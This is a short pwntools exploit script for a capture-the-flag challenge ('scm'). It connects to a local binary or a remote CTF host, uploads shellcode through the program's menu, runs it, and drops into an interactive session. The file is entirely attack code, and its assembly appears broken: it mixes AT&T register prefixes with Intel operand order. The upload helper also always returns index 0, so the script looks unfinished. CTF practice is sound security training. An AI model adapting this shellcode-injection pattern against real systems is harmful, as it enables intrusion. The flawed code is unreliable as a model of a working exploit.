#!/usr/bin/env python3
from pwn import *
context.arch = "amd64"

elf = ELF("./given/scm")
def conn():
    if args.REMOTE:
        p = remote("chals.damctf.xyz", 30200)
    else:
        p = process([elf.path])
    return p


def add_shellcode(mode, size, shellcode, p):
    shellcode = shellcode.ljust(size, b"\xc3")
    p.recvuntil(b"Choice: ")
    p.sendline(b"1")
    p.recvuntil(b"Shellcode type (1=simple, 2=read, 3=write):")
    p.sendline(str(mode).encode())
    p.recvuntil(b"Size of shellcode:")
    p.sendline(str(size).encode())
    p.recvuntil(b"Shellcode:")
    p.sendline(shellcode)
    return 0

def exec_shellcode(shellcode_idx, p):
    p.recvuntil(b"Choice: ")
    p.sendline(b"3")
    p.recvuntil(b"Shellcode index:")
    p.sendline(str(shellcode_idx).encode())
    p.recvuntil(b"Running shellcode...")
    #leak = p.recvuntil(b"done\n")
    #print("leak:", leak)

def my_shellcode():
    sc = """
        push %rbx;
        mov %rdx, 0x8;
        mov %rcx, %rsp;
        mov %rbx, 1;
        mov %rax, 1;
        syscall;
        ret;
    """
    return asm(sc)

def exploit():
    p = conn()
    sh_idx = add_shellcode(3, 0x40, my_shellcode(), p)
    exec_shellcode(sh_idx, p)
    p.interactive()

if __name__ == '__main__':
    exploit()
